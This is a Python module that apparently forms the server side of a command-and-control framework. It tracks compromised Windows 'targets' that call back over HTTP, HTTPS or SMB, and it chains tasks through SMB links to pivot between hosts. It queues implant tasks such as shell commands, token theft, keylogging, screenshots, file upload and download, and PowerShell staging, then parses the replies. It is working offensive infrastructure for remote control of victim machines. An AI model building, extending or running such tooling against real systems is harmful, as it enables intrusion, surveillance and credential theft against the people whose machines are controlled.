import re
import logging
import time
import random
import struct
from enum import Enum

from core import logging
from core.config import SMBConfig

Targets = {}
ActiveTarget = None
LastTask = None
PendingLink = None
FinishFunctions = {}

class TaskCode(Enum):
    Exit = 0
    TargetInfo = 1
    Idletime = 2
    GetPID = 3
    GetUID = 4
    Logon = 5
    GetPrivs = 6
    Shell = 7
    TCPConnect = 8
    Tasklist = 9
    StealToken = 10
    Dir = 11
    ScreenShot = 12
    Upload = 13
    Download = 14
    RemoveFile = 15
    Keylogger = 16
    Powershell = 17
    StagePowershell = 18
    

class ReturnCode(Enum):
    Success = 0
    Failure = 1
    FunctionalityNotImplemented = 2

class Arch(Enum):
    x64 = "x64"
    x86 = "x86"
    Wow64 = "SysWoW64"

class CallbackType(Enum):
    HTTP = "HTTP"
    HTTPS = "HTTPS"
    SMB = "SMB"

class OSVersion(Enum):
    WindowsXP    = "5.10"
    WindowsXP64  = "5.20"
    Server2003   = "5.21"
    Vista        = "6.00"
    Windows7     = "6.10"
    Windows8     = "6.20"
    Server2008   = "6.01"
    Server2008R2 = "6.11"
    Server2012   = "6.21"
    Windows81    = "6.30"
    Server2012R2 = "6.31"
    Windows10    = "10.00"

class Task(object):

    def __init__(self, task_code, argument1 = "", argument2 = "", cache = {}, forward_chain = [], target = ActiveTarget):
        self.code = TaskCode(task_code)
        self.unique_id = random.randint(100, 99999)
        self.argument1 = argument1
        self.argument2 = argument2
        self.cache = cache
        self.completed = False
        self.forward_chain = forward_chain
        self.target = target

class TaskResponse(object):

    def __init__(self, raw_data = None):
        self.unique_id = 0
        self.return_code = 0
        self.return_data = None
        self.success = False
        self.extra_output = None

        if raw_data:
            self.unique_id = struct.unpack('I', raw_data[:4])[0]
            self.return_code = struct.unpack('I', raw_data[4:8])[0]

            return_data_length = struct.unpack('I', raw_data[8:12])[0]
            self.return_data = raw_data[12:12+return_data_length]
            self.extra_output = raw_data[12+return_data_length:]

            if self.return_code == 0:
                self.success = True

class Target(object):

    def __init__(self, target_id, os_version, machine_name, architecture, callback_type, source_address):
        self.target_id = target_id
        self.os_version = OSVersion(os_version)
        self.machine_name = machine_name
        self.architecture = Arch(architecture)
        self.callback_type = CallbackType(callback_type)
        self.source_address = source_address
        self.pending_tasks = []
        self.submitted_tasks = []
        self.completed_tasks = []
        self.forward_chain = [] # Stores the actual hosts/ips used to forward data
        self.forward_targets = [] # Stores the targets which are part of the chain

    def add_task(self, task):
        task.target = self
        if self.forward_chain:
            task.forward_chain = self.forward_chain + task.forward_chain
            self.forward_targets[0].pending_tasks.append(task)
        else:
            self.pending_tasks.append(task)

    def get_task(self):
        task = self.pending_tasks.pop(0)
        self.submitted_tasks.append(task)

        code = task.code
        arg1 = task.argument1
        arg2 = task.argument2

        if type(arg1) is str:
            arg1 = arg1.encode()

        if type(arg2) is str:
            arg2 = arg2.encode()

        arg1 = struct.pack('I', len(arg1)) + arg1
        arg2 = struct.pack('I', len(arg2)) + arg2

        if type(code) is TaskCode:
            code = code.value
        
        header = b''

        for link in task.forward_chain:
            header += struct.pack('BB', SMBConfig.SpecialByte, len(link)) + link.encode()

        serialized_data = header + struct.pack('B', code) + struct.pack('I', task.unique_id) + arg1 + arg2

        return task, serialized_data


def add_callback(callback_string, source_address, using_ssl = False):
    global Targets, ActiveTarget
    
    ((junk, target_id, os_version, machine_name, architecture, cb_type),) = re.findall(r'(.+?)\|(.+?)\|(.+?)\|(.+?)\|(.+?)\|(.+)', callback_string)

    current_time = time.strftime("%H:%M on %b %d", time.gmtime())

    if target_id not in Targets:

        logging.success("Added new {0} target {1} from {2} at {3}".format(cb_type, target_id, source_address, current_time))

        Targets[target_id] = Target(target_id, os_version, machine_name, architecture, cb_type, source_address)
        Targets[target_id].last_seen = current_time

        if ActiveTarget is None:
            ActiveTarget = Targets[target_id]
        
    else:
        if cb_type == CallbackType.SMB.value:
            logging.success("Relinked to {0} through {1}".format(target_id, source_address))
            
        Targets[target_id].source_address = source_address
        Targets[target_id].last_seen = current_time
            
    return Targets[target_id]


def handle_result(postback_string):
    global Targets, ActiveTarget, FinishFunctions, PendingLink

    response = TaskResponse(postback_string)

    if response.extra_output:
        logging.print("")
        logging.log("--- Extra Output ---", msgType=0, color='green')
        logging.print(response.extra_output.decode())
        logging.log("--------------------", msgType=0, color='green')
        logging.print("")

    task = None
    matching_target = None

    for target in Targets.values():
        for index,submitted in enumerate(target.submitted_tasks):
            if response.unique_id == submitted.unique_id:
                task = submitted
                matching_target = target
                target.completed_tasks.append(task)
                del target.submitted_tasks[index]
                break
        if task:
            break

    if task is None:
        return False

    task.completed = True

    if PendingLink and response.unique_id == PendingLink.unique_id:
        PendingLink = None
        if response.success:
            new_target = add_callback(response.return_data.decode(), matching_target.target_id)
            new_target.forward_chain = task.forward_chain
            new_target.forward_targets = list(matching_target.forward_targets)
            new_target.forward_targets.append(matching_target)
            return True
        else:
            logging.error("Failed to link to target")
            return False
        
    if response.return_code == SMBConfig.SpecialByte and not response.success:
        logging.error('Failed to forward tasking to {0}'.format(matching_target.target_id))
        return False

    if response.return_code == ReturnCode.FunctionalityNotImplemented.value:
        logging.error("Functionality not implemented in this target")
        return False
        
    function_name = 'finish_' + TaskCode(task.code).name.lower()

    if function_name not in FinishFunctions:
        logging.error('Could not locate {0} to handle task {1} response'.format(function_name, task.unique_id))
        return False

    FinishFunctions[function_name](response, task.cache)

    return True        


def send_task(task_code, argument1 = '', argument2 = '', cache = {}, target = None):
    global Targets, ActiveTarget, LastTask

    if type(target) is str:
        target = Targets[target]

    if target is None:
        target = ActiveTarget
    
    if target is None:
        logging.error('Cannot send tasking without an active target.')
        return False

    new_task = Task(task_code, argument1, argument2, cache)

    if task_code != TaskCode.Exit:
        LastTask = new_task

    target.add_task(new_task)

    return True